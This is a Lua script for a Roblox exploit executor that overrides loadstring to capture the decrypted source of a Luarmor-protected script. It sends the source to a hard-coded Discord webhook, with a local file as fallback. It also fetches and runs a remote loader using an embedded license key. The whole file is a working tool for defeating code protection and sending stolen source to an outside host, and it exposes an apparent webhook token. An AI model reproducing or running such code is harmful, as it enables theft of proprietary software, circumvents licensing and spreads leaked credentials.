--[[
  Capture Luarmor decrypted source → Discord webhook (or file).
  NO debug hook = NO freeze. Uses wrapper only.
]]

local _K = "XEBGtoEqCvrdDyGxWPpcKrHYKGxvrijf"
local _U = "https://api.luarmor.net/files/v4/loaders/d4d2ab3a331f01b3bad075746b35b9f7.lua"
local _W = "https://discord.com/api/webhooks/1479359786561835118/h-J6cqgI66Kddz4_PlnmYq92Xn5b6BBXEAByZNzF_sf1HPLgUX4NhVkYzkdAFpbXcz8-"

local _n = 0
local _maxChunk = 3900
local _real = loadstring

local function _escape(s)
	return tostring(s):gsub("\\", "\\\\"):gsub('"', '\\"'):gsub("\n", "\\n"):gsub("\r", "\\r")
end

local function _post(content)
	local body = "{\"content\":" .. ("%q"):format(_escape(tostring(content):sub(1, 2000))) .. "}"
	pcall(function()
		if type(request) == "function" then request({ Url = _W, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body }) return end
		if type(http_request) == "function" then http_request({ Url = _W, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body }) return end
		if type(syn and syn.request) == "function" then syn.request({ Url = _W, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body }) return end
		if game and game.GetService then game:GetService("HttpService"):PostAsync(_W, body) end
	end)
end

local function _sendHttp(body, contentType)
	contentType = contentType or "application/json"
	if type(request) == "function" then request({ Url = _W, Method = "POST", Headers = { ["Content-Type"] = contentType }, Body = body }) return end
	if type(http_request) == "function" then http_request({ Url = _W, Method = "POST", Headers = { ["Content-Type"] = contentType }, Body = body }) return end
	if type(syn and syn.request) == "function" then syn.request({ Url = _W, Method = "POST", Headers = { ["Content-Type"] = contentType }, Body = body }) return end
	if game and game.GetService then game:GetService("HttpService"):PostAsync(_W, body) end
end

-- Send full source as ONE file attachment
local function _sendAsFile(s)
	local boundary = "----Boundary" .. tostring(math.random(100000, 999999))
	local header = "Content-Disposition: form-data; name=\"content\"\r\n\r\nCaptured (" .. #s .. " chars).\r\n"
	local filePart = "Content-Disposition: form-data; name=\"file\"; filename=\"source.lua\"\r\nContent-Type: text/plain\r\n\r\n"
	local body = "--" .. boundary .. "\r\n" .. header .. "--" .. boundary .. "\r\n" .. filePart .. s .. "\r\n--" .. boundary .. "--\r\n"
	return pcall(function()
		_sendHttp(body, "multipart/form-data; boundary=" .. boundary)
	end)
end

-- Capture: only send/save the BIG one (decrypted script). Ignore small loader.
local function _send(s)
	if type(s) ~= "string" then return end
	-- Skip tiny chunks (loader is small; real script is 100k+)
	if #s < 5000 then return end
	_n = _n + 1
	-- Run in next frame so we don't block the loader
	(task and task.defer or spawn or function(f) f() end)(function()
		pcall(function()
			local ok = _sendAsFile(s)
			if ok then
				_post("Captured full source (" .. #s .. " chars) as file attachment.")
				return
			end
			if writefile then
				pcall(function() if makefolder then makefolder("static_content_130525") end end)
				writefile("static_content_130525/source_captured.lua", s)
				_post("Saved to static_content_130525/source_captured.lua (" .. #s .. " chars)")
				return
			end
			-- Fallback: first chunk only
			_sendHttp((game and game.GetService and game:GetService("HttpService"):JSONEncode({
				content = #s .. " chars - download file from executor folder",
				embeds = { { description = "```lua\n" .. s:sub(1, _maxChunk) .. "\n```" } }
			})) or "{\"content\":\" " .. #s .. " chars\"}")
		end)
	end)
end

-- Replace loadstring BEFORE running loader so we capture both loader and decrypted script.
-- No hook = no freeze.
loadstring = function(src, name)
	if type(src) == "string" then _send(src) end
	return _real(src, name)
end

script_key = _K
loadstring(game:HttpGet(_U))()
